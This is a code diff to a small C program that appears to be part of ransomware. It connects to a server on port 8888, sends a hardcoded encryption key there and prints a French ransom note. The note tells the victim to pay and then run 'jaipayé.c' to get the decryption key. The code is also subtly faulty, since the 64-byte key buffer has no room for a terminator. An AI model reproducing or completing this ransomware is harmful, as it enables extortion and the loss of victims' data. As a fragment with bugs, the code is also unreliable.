@@ -8,12 +8,7 @@
 #include <netdb.h>
 #define BUFFER_SIZE 1024
 
-
-void handle_error(){
-    printf("error\n");
-    exit(0);
-}
-int main (void){
+int main (){
     
     int sockid;
     int server_port = 8888;
@@ -26,11 +21,13 @@ int main (void){
     server_addr.sin_port = htons(server_port);
     server_addr.sin_addr.s_addr = inet_addr(server_ip);
 
-    char *msg = "84, 0x68, 0x61, 0x74, 0x73, 0x20, 0x6d, 0x79, 0x20, 0x4b, 0x75, 0x6e, 0x67, 0x20, 0x46, 0x75";
-
-    connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr));
-
-    send(sockid,(const char *)msg,strlen(msg),0);
+    char key[64] = "hfqssqkfdqshflkqhfqssqkfdqshflkqhfqssqkfdqshflkqhfqssqkfdqshflkq";
+    char msg[97];
+    if(connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr)) < 0){
+    	printf("Erreur lors de la connection");
+    	exit(1);
+    }
+    send(sockid,(const char *)key,strlen(key),0);
     close(sockid);
     printf("Lorsque vous avez payé la rançon lancez le programme jaipayé.c la clé de déchiffrage vous sera donnée dans l'heure");
     
